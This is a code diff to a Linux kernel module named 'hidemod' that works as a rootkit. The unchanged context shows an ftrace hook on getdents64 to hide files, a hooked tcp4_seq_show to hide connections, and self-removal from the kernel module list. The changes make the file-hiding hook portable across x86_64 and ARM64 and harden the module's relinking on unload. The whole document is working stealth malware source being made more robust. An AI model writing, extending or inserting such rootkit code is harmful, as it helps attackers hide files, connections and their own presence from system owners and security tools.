@@ -318,10 +318,27 @@ static int hooked_tcp4_seq_show(struct seq_file *seq, void *v)
 }
 
 /* ── ftrace hook table ─────────────────────────────────────────── */
+/*
+ * The syscall wrapper name is architecture-specific:
+ *   x86_64:  __x64_sys_getdents64
+ *   ARM64:   __arm64_sys_getdents64
+ *   generic: __do_sys_getdents64  (internal, not always exported)
+ *
+ * We select the correct name at compile time so the module builds
+ * on any supported architecture.
+ */
+#if defined(CONFIG_X86_64)
+#define GETDENTS64_SYMBOL "__x64_sys_getdents64"
+#elif defined(CONFIG_ARM64)
+#define GETDENTS64_SYMBOL "__arm64_sys_getdents64"
+#else
+/* Fallback: try the generic do_sys wrapper (may fail on some kernels) */
+#define GETDENTS64_SYMBOL "__do_sys_getdents64"
+#endif
 
 static struct ftrace_hook hooks[] = {
     {
-        .name     = "__x64_sys_getdents64",
+        .name     = GETDENTS64_SYMBOL,
         .function = hooked_getdents64,
         .original = &orig_getdents64,
     },
@@ -458,6 +475,17 @@ static struct miscdevice hidemod_dev = {
 
 /* ── Module self-hiding ────────────────────────────────────────── */
 
+/*
+ * module_prev: saved list position so we can re-link on exit.
+ *
+ * DANGER: This pointer can become stale (dangling) if the module that
+ * occupied this list position is unloaded while we are hidden.  The
+ * kernel may reuse the freed memory for a new allocation, making any
+ * dereference of module_prev undefined behaviour.  hidemod_exit()
+ * performs a best-effort consistency check before relinking, but the
+ * only truly safe approach is to minimise the time spent hidden or to
+ * walk the live module list on exit to find a valid insertion point.
+ */
 static struct list_head *module_prev;
 static bool module_hidden = false;
 
@@ -522,10 +550,25 @@ static void __exit hidemod_exit(void)
 {
     int i;
 
-    /* Restore module visibility so rmmod works cleanly */
+    /*
+     * Restore module visibility so rmmod works cleanly.
+     *
+     * module_prev may be dangling if the adjacent module was unloaded
+     * while we were hidden.  Perform a best-effort consistency check:
+     * a valid doubly-linked list node satisfies prev->next->prev == prev.
+     * If the check fails we skip relinking — the module will still
+     * unload, but /proc/modules may remain inconsistent.
+     */
     if (module_hidden && module_prev) {
-        list_add(&THIS_MODULE->list, module_prev);
-        module_hidden = false;
+        if (module_prev->next && module_prev->prev &&
+            module_prev->next->prev == module_prev) {
+            list_add(&THIS_MODULE->list, module_prev);
+            module_hidden = false;
+        } else {
+            pr_warn("hidemod: module_prev list pointers inconsistent "
+                    "(stale?), skipping relink — /proc/modules may "
+                    "be inconsistent after unload\n");
+        }
     }
 
     /* Remove all hooks */
